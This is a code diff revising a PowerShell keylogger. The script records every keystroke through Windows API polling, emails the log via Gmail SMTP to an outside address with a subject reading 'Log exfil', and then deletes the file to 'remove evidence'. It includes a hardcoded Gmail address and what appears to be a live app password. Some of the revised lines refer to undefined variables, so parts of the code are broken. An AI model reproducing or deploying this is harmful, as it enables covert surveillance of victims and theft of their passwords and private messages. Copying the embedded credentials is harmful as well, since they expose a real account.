@@ -1,28 +1,21 @@
-# gmail credentials
+# set config for email
 $From = "injectionkeystroke@gmail.com"
 $To = "maklo119@hhu.de"
-$password = "wxmukckmhuetdmvt" | ConvertTo-SecureString -AsPlainText -Force
+$Subject = "Log exfil from $($env:computername) User:$($env:UserName)"
+$Password = "wxmukckmhuetdmvt" | ConvertTo-SecureString -AsPlainText -Force
+$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $From, $Password
 
-
-# keylogger
-function KeyLogger($logFile="$env:temp/$env:UserName.log") {
-
-  # email process
-  $subject = "$env:UserName logs"
-  $smtp = New-Object System.Net.Mail.SmtpClient("smtp.gmail.com", "587");
-  $smtp.EnableSSL = $true
-  $smtp.Credentials = New-Object System.Net.NetworkCredential($from, $password);
+function Logger($logFile="$env:temp/$env:UserName.log") {
 
   #check if logger needs to create file
   if (Test-Path $logFile) {
-      $smtp.Send($from, $To, $subject, (Get-Content "$logFile"));
+    # Dateiinhalt auslesen
+    $content = Get-Content -Path $pathtofile
+    # Send mail
+    Send-MailMessage -From $From -To $To -Subject $Subject -Body $content -SmtpServer "smtp.gmail.com" -port 587 -UseSsl -Credential $Credential
+    # Remove evidence
+    Remove-Item $pathtofile -Force
   }
-  else {
-      # File doesn't exist, create it
-      $null | Out-File -FilePath $logFile
-  }
-  $logs = Get-Content "$logFile"
-
 
   # generate log file
   $generateLog = New-Item -Path $logFile -ItemType File -Force
@@ -46,20 +39,16 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
   try {
     while ($true) {
       Start-Sleep -Milliseconds 10
-
+      #iterate through all keys to see if they are pressed
       for ($ascii = 9; $ascii -le 254; $ascii++) {
-
-        # use API to get key state
+        #get key state
         $keystate = $API::GetAsyncKeyState($ascii)
-
-        # use API to detect keystroke
+        # check if key is pressed
         if ($keystate -eq -32767) {
           $null = [console]::CapsLock
-
           # map virtual key
           $mapKey = $API::MapVirtualKey($ascii, 3)
-
-          # create a stringbuilder
+          # get keyboard state and create stringbuilder
           $keyboardState = New-Object Byte[] 256
           $hideKeyboardState = $API::GetKeyboardState($keyboardState)
           $loggedchar = New-Object -TypeName System.Text.StringBuilder
@@ -76,11 +65,15 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 
   # send logs if code fails
   finally {
-    # send email
-    $smtp.Send($From, $To, $subject, $logs);
-    notepad $logFile
+    notepad $logPath
+    # Dateiinhalt auslesen
+    $content = Get-Content -Path $pathtofile
+    # Send mail
+    Send-MailMessage -From $From -To $To -Subject $Subject -Body $content -SmtpServer "smtp.gmail.com" -port 587 -UseSsl -Credential $Credential
+    # Remove evidence
+    Remove-Item $pathtofile -Force
   }
 }
 
-# run keylogger
-KeyLogger
+# run logger
+Logger
